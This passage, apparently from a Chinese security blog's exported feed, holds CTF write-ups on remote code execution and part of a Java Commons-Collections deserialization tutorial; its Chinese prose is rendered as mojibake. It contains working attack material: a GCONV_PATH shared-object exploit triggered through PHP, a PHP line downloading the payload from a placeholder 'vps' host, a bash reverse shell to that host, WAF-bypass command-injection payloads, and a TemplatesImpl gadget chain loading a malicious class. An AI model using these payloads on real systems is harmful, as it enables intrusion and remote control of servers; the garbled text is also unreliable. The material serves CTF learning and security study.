&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;/readflag &gt; /tmp/out.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘exp.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ exp.so</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="number">0</span>=<span class="variable">$url</span>=<span class="string">&quot;http://vps:port/exp.so&quot;</span>;<span class="variable">$file1</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="variable">$url</span>,<span class="string">&#x27;r&#x27;</span>);<span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">while</span>(!<span class="variable">$file1</span>-&gt;<span class="title function_ invoke__">eof</span>())&#123;<span class="variable">$a</span>=<span class="variable">$a</span>.<span class="variable">$file1</span>-&gt;<span class="title function_ invoke__">fgets</span>();&#125;<span class="variable">$file2</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/tmp/exp.so&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);<span class="variable">$file2</span>-&gt;<span class="title function_ invoke__">fwrite</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><strong>è§¦å‘exp.so</strong></p><p>iconvè¢«banäº†ï¼Œç”¨<code>php://filter</code>ä¸­çš„ <code>convert.iconv</code> è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="number">0</span>=<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>è¯»out.txt</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="number">0</span>=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;/tmp/out.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCQ9hsP"><img src="https://s1.ax1x.com/2023/06/16/pCQ9hsP.png" alt="pCQ9hsP.png"></a></p><p>åå¼¹shellä¹Ÿè¡Œ</p><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCQi8Vf"><img src="https://s1.ax1x.com/2023/06/16/pCQi8Vf.png" alt="pCQi8Vf.png"></a></p><h2 id="PYRCE"><a href="#PYRCE" class="headerlink" title="PYRCE"></a>PYRCE</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/ | &#123;&#125; * !;@#\n `~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>é€»è¾‘ç®€å•ï¼Œä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œåœ¨<code>os.popen()</code>å¤„æ‰§è¡Œå‘½ä»¤ï¼Œéš¾ç‚¹åœ¨äºç»•é»‘åå•ä»¥åŠ<code>os.popen()</code>æ— å›æ˜¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\t $ &amp; () , . : ? ä»¥åŠå¤§å°å†™å­—æ¯ï¼ˆé™¤u n)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Å‡Å›Å›=cp$(cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;cd..&amp;&amp;echo$(pwd)flag)app.py</span><br></pre></td></tr></table></figure><p>3ä¸ªç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.%09(tab)ä»£æ›¿ç©ºæ ¼</span><br><span class="line">2.echo$(pwd)è·å– /</span><br><span class="line">3.å°†flagå†…å®¹å¸¦åˆ°app.py</span><br></pre></td></tr></table></figure><p>å°†payload urlç¼–ç ä¸€ä¸‹ï¼Œè®¿é—®app.pyè·å¾—flag</p><h2 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h2><p>ç™»å½•å¼±å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤è¯¸å¤šå…³é”®å­—</p><p>å…³é”®æ˜¯ç”¨%0a(æ¢è¡Œç¬¦)ï¼Œ%0d(å›è½¦ç¬¦)ç»•è¿‡<code>;</code>ï¼Œå…¶ä»–è¿‡æ»¤éƒ½å¥½ç»•</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0dcd%09kyl*%0atac%09fla*</span><br></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>ç¬”è€…çš„æ€»ç»“åŸºæœ¬åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œå¦‚ä»Šctfçº¯ç²¹çš„rceé¢˜ç›®å·²ç»æ¯”è¾ƒå°‘äº†ï¼Œå¸¸è§çš„æ— å­—æ¯æ•°å­—ï¼Œæ— å‚æ•°ç­‰ç­‰å·²ç»è¢«ç©çƒ‚äº†ï¼Œèµ·åˆå†™è¿™ç¯‡æ–‡ç« åªæ˜¯æƒ³è®°å½•ä¸¤ä¸ªæ¯”è¾ƒæœ‰è¶£çš„phpè‡ªå¢è‡ªå‡é¢˜ç›®ï¼Œä¸çŸ¥ä¸è§‰å†™äº†é‚£ä¹ˆå¤šï¼Œç›¸ä¿¡è¿˜æœ‰å¾ˆå¤šrceçš„æ–¹å¼æœ‰å¾…æŒ–æ˜ã€‚</p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p>1.<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p>2.<a href="https://f5.pm/go-29700.html">æ— å­—æ¯æ•°å­—webshellæ€»ç»“</a></p><p>3.<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p>4.<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE Â· skyâ€™s blog (skysec.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--CC3</title>
      <link href="/2022/10/06/CC3/"/>
      <url>/2022/10/06/CC3/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collecttions3ååºåˆ—åŒ–"><a href="#Commons-Collecttions3ååºåˆ—åŒ–" class="headerlink" title="Commons-Collecttions3ååºåˆ—åŒ–"></a>Commons-Collecttions3ååºåˆ—åŒ–</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºMavené¡¹ç›®ï¼Œå¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="InvokerTransformeré“¾"><a href="#InvokerTransformeré“¾" class="headerlink" title="InvokerTransformeré“¾"></a>InvokerTransformeré“¾</h2><p>æ‹¼å‡‘CC1</p><p><a href="https://imgse.com/i/ppm1al9"><img src="https://s1.ax1x.com/2023/03/08/ppm1al9.png" alt="ppm1al9.png"></a></p><p>or</p><p><a href="https://imgse.com/i/ppm1x00"><img src="https://s1.ax1x.com/2023/03/08/ppm1x00.png" alt="ppm1x00.png"></a></p><p>æ‹¼å‡‘CC6</p><p><a href="https://imgse.com/i/ppm1z7V"><img src="https://s1.ax1x.com/2023/03/08/ppm1z7V.png" alt="ppm1z7V.png"></a></p><p>å¯¹äºç±»çš„åŠ¨æ€åŠ è½½åœ¨ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä½¿ç”¨<code>defineClass</code>è¿›è¡ŒåŠ è½½ï¼Œä½†æ˜¯åªåšç±»åŠ è½½çš„è¯æ˜¯ä¸ä¼šæ‰§è¡Œä»£ç çš„</p><p><a href="https://imgse.com/i/ppeh59S"><img src="https://s1.ax1x.com/2023/03/08/ppeh59S.png" alt="ppeh59S.png"></a></p><p>æ‰€ä»¥è¿˜éœ€æ‰¾åˆ°ä¸€ä¸ªè¿›è¡Œåˆå§‹åŒ–çš„åœ°æ–¹</p><p>åŒæ—¶è¿™é‡Œçš„defineClassä¸ºprotectedï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªé‡å†™ä¸”ä¸ºpublicçš„åœ°æ–¹è¿›è¡Œè°ƒç”¨</p><p><code>TemplatesImpl.defineClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppe5Jd1"><img src="https://s1.ax1x.com/2023/03/08/ppe5Jd1.png" alt="ppe5Jd1.png"></a></p><p><code>TemplatesImpl.getTransletInstance</code>é‡Œæœ‰ä¸€ä¸ªnewInstanceçš„å®ä¾‹åŒ–è¿‡ç¨‹,å½“ç±»åŠ è½½å®Œæˆèµ°åˆ°è¿™é‡Œå°±å¯ä»¥æ‰§è¡Œä»£ç </p><p><a href="https://imgse.com/i/ppe50Qe"><img src="https://s1.ax1x.com/2023/03/08/ppe50Qe.png" alt="ppe50Qe.png"></a></p><p>ä½†ç”±äºæ˜¯privateï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸Šæ‰¾</p><p><code>TemplatesImpl.newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªéœ€è¦è°ƒç”¨åˆ°<code>TemplatesImpl.newTransformer</code>å³å¯ï¼Œåˆ©ç”¨CC1å’ŒCC6éƒ½è¡Œ</p><p>ååŠæ®µæ„é€ </p><p><code>TemplatesImpl.getTransletInstance</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€æ»¡è¶³<code>_name</code>ä¸ä¸ºç©ºï¼Œ<code>_class</code>ä¸ºç©º</p><p>è·Ÿè¿›<code>defineTransletClasses</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>_bytecodesä¸èƒ½ä¸ºç©º,æ³¨æ„åˆ°ä¸‹é¢è¿˜æœ‰ä¸ª<code>_tfactory.getExternalExtensionsMap()</code>ï¼Œ<code>_tfactory</code>è°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½ä¸ºç©º</p><p><strong><code>_name</code>èµ‹å€¼</strong></p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong><code>_bytecodes</code>èµ‹å€¼</strong></p><p>_bytecodesç±»å‹ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹<code>defineClass</code>çš„é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦çš„æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ‰€ä»¥èµ‹å€¼æ—¶éœ€è¦åœ¨å¤–é¢å¥—ä¸€å±‚â€œçš®â€ï¼Œå°†ä¸€ç»´æ•°ç»„æ„é€ æˆæ¶æ„ç±»</p><p><strong>demo2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\cc3\\Evil.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates, codes);</span><br></pre></td></tr></table></figure><p><strong>Evil.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„</p><p>åœ¨defineTransletClassesä¸­æœ‰å¦‚ä¸‹åˆ¤æ–­ï¼Œåˆ¤æ–­åŠ è½½çš„è¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯å¦ä¸º com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ï¼Œå¦‚æœä¸æ˜¯é‚£ä¹ˆ _transletIndex ä¼šè¢«èµ‹å€¼ä¸º - 1 ï¼Œç»§è€Œä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯</p><p><a href="https://imgse.com/i/ppeTxOg"><img src="https://s1.ax1x.com/2023/03/08/ppeTxOg.png" alt="ppeTxOg.png"></a></p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>ç±»</p><p><strong><code>_tfactory</code> èµ‹å€¼</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>_tfactoryå±æ€§æ˜¯transientï¼Œä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥ç›´æ¥å»ä»–çš„readObjecté‡Œçœ‹çœ‹æ˜¯æ€ä¹ˆèµ‹å€¼çš„</p><p><a href="https://imgse.com/i/ppe7D9P"><img src="https://s1.ax1x.com/2023/03/08/ppe7D9P.png" alt="ppe7D9P.png"></a></p><p>ç›´æ¥èµ‹å€¼ä¸ºè¿™ä¸ªå°±å¥½äº†</p><p><strong>demo3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªéœ€è¦è°ƒç”¨åˆ°<code>TemplatesImpl.newTransformer</code>å³å¯ï¼Œåˆ©ç”¨CC1å’ŒCC6éƒ½è¡Œ</p><h3 id="CC1ç‰ˆæœ¬"><a href="#CC1ç‰ˆæœ¬" class="headerlink" title="CC1ç‰ˆæœ¬"></a><strong>CC1</strong>ç‰ˆæœ¬</h3><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 